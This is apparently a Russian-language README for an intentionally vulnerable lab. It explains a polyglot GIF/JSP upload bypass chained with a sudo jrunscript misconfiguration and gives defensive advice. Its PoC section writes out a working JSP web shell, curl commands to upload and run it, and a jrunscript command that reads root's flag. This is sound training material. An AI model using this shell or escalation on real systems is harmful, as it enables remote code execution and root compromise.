# Polyglot File Upload & jrunscript PrivEsc

## 1. Описание уязвимостей

**Polyglot File Upload (Bypass):** Некорректная валидация загружаемых файлов. Сервер проверяет содержимое файла, ориентируясь только на "Magic Bytes" (сигнатуру заголовка), чтобы убедиться, что это GIF-изображение. Однако он не проверяет итоговое расширение файла. Это позволяет загрузить Polyglot-файл: валидный GIF, который одновременно содержит исполняемый код (например, JSP).
**Sudo Misconfiguration (jrunscript):** Утилита `jrunscript` поставляется вместе с JDK и предназначена для выполнения скриптов (например, JavaScript через встроенный движок Nashorn). Наличие прав на ее запуск через `sudo` без пароля (NOPASSWD) позволяет атакующему выполнить произвольные системные команды с правами `root`.

## 2. Способы защиты

**Для загрузки файлов:** Проверять не только содержимое (Magic Bytes), но и жестко ограничивать список разрешенных расширений (White-list). Переименовывать файлы при загрузке (например, в случайный UUID без сохранения оригинального имени) и хранить их вне директории, доступной веб-серверу для исполнения.
**Для системных задач:** Регулярно проводить аудит правил `sudoers`. Никогда не выдавать права `NOPASSWD` на интерпретаторы и системные утилиты, способные выполнять команды (так называемые GTFOBins), такие как `tar`, `find`, `jrunscript`, `awk`, `bash` и т.д.

## 3. Инструкция по запуску

```bash
docker-compose up -d --build
```
Приложение будет доступно по адресу: `http://localhost:8080`

## 4. Описание уязвимости в приложении

Приложение состоит из двух уязвимых компонентов, формирующих цепочку атаки (Kill Chain):

1. **Веб-загрузчик аватаров (`upload.jsp`):** Разработчики реализовали функцию загрузки картинок (GIF) и добавили проверку безопасности. Загрузчик считывает первые 4 байта загружаемого файла и сверяет их с сигнатурой `GIF8`. Если проверка пройдена, файл сохраняется в публичную директорию `/uploads/`.
   **Ошибка логики:** Сохраняется *оригинальное имя файла*, переданное пользователем. Атакующий может внедрить сигнатуру `GIF89a` в самое начало `.jsp` файла. Tomcat распознает файл по расширению `.jsp` и выполнит его содержимое, проигнорировав "мусорные" байты GIF-сигнатуры в начале.

2. **Некорректная настройка прав (`/etc/sudoers`):** Для выполнения неких служебных задач пользователю `www-data` (от имени которого работает Tomcat) выданы права на запуск `/usr/local/openjdk-11/bin/jrunscript` от имени `root` без ввода пароля.
   **Ошибка конфигурации:** `jrunscript` — это консольный интерпретатор скриптов для Java. Используя флаг `-e`, можно передать ему inline-скрипт на JavaScript. Встроенный JS-движок имеет прямой доступ к Java API, включая `java.lang.Runtime.getRuntime().exec()`, что позволяет запустить любой бинарник в системе (например, `/bin/sh` или `cat`) от имени суперпользователя.

## 5. POC (эксплоит)

### Шаг 1: Первичный доступ (RCE через Polyglot)

Создаем JSP-шелл. Для этого в начало файла записываем сигнатуру `GIF89a`, а затем — классический Java-код для выполнения команд операционной системы:

```bash
echo -e 'GIF89a\n<%\n if(request.getParameter("cmd")!=null){\n Process p=Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",request.getParameter("cmd")});\n java.io.BufferedReader r=new java.io.BufferedReader(new java.io.InputStreamReader(p.getInputStream()));\n String l; while((l=r.readLine())!=null) out.println(l);\n }\n%>' > shell.jsp
```

Загружаем файл на сервер, обходя проверку:
```bash
curl -X POST -F "file=@shell.jsp" http://localhost:8080/upload.jsp
```

Проверяем выполнение команд и забираем флаг пользователя:
```bash
curl -s "http://localhost:8080/uploads/shell.jsp?cmd=cat%20/home/user.txt"
```

### Шаг 2: Повышение привилегий (Privilege Escalation)

Через наш веб-шелл проверяем, какие привилегии `sudo` нам доступны:
```bash
curl -s "http://localhost:8080/uploads/shell.jsp?cmd=sudo%20-l"
```
В выводе мы увидим `(root) NOPASSWD: /usr/local/openjdk-11/bin/jrunscript`.

Используем утилиту `jrunscript` и движок Nashorn для выполнения системной команды чтения рутового флага:
```bash
curl -s -X POST http://localhost:8080/uploads/shell.jsp \
     --data-urlencode "cmd=sudo /usr/local/openjdk-11/bin/jrunscript -e \"var p=java.lang.Runtime.getRuntime().exec('cat /root/root.txt'); var s=new java.util.Scanner(p.getInputStream()).useDelimiter('\\\\A'); print(s.hasNext()?s.next():'')\""
```
